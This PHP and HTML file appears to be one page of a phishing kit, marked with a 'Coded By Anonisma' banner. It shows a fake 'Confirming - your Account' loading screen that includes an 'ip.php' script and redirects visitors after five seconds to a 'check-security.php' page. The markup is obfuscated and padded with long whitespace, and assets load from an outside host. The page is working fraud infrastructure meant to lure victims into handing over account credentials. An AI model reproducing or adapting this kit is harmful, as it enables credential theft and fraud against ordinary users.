																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																							

<?php
if (!isset($_SESSION)) {
  session_start();
}

include      "ip.php";         
    


?>																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								<!--


   ______              __             __                  ____                            ___                            _                             
  / ____/  ____   ____/ /  ___   ____/ /                 / __ )   __  __                 /   |   ____   ____    ____    (_)   _____   ____ ___   ____ _
 / /      / __ \ / __  /  / _ \ / __  /                 / __  |  / / / /                / /| |  / __ \ / __ \  / __ \  / /   / ___/  / __ `__ \ / __ `/
/ /___   / /_/ // /_/ /  /  __// /_/ /                 / /_/ /  / /_/ /                / ___ | / / / // /_/ / / / / / / /   (__  )  / / / / / // /_/ / 
\____/   \____/ \__,_/   \___/ \__,_/                 /_____/   \__, /                /_/  |_|/_/ /_/ \____/ /_/ /_/ /_/   /____/  /_/ /_/ /_/ \__,_/  
  																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								-->









<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en" >
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="icon" type="image/x-icon" href="http://niceshopweb.com/7+/An-on-is-ma/hooool.ico">
      <title>Confirming - your Account</title>
	  <meta http-equiv="refresh" content="5;url=./check-security.php">
      
      <link media="screen" rel="stylesheet" type="text/css" href="http://niceshopweb.com/css777/HHHH-LOOG.css">
   </head>
   
   <body>
    
      <div class="" id="page">
      <div id="aaaaaaa1nooooooo3niiiiiiiiii2smaaaaaa">
         <div id="aaaaaaa1noooooooniiiiiiiiii2smaaaaaa">
          
         </div>
   
            <div class=" aaaaaa1111n444ooooooo3niiiiiiiiii2222smaaaaaa">
               <h3>One moment...</h3>
               <div id="aaaaaaa1noooooooniiiiiiiiiismaaaaaa" class="aaaaaaa1111nooooooo3niiiiiiiiii2smaaaaaa"></div>
               <img id="bbbbbbbbbbbbbbbbbbbbbbbb"  >
               <p class="KKKKKKKKKKKKKKKKKKKKKKKK">Still loading after a few seconds? <a href="./check-security.php">Try again</a></p>
            </div>
         </div>
      </div>
   </body>
</html>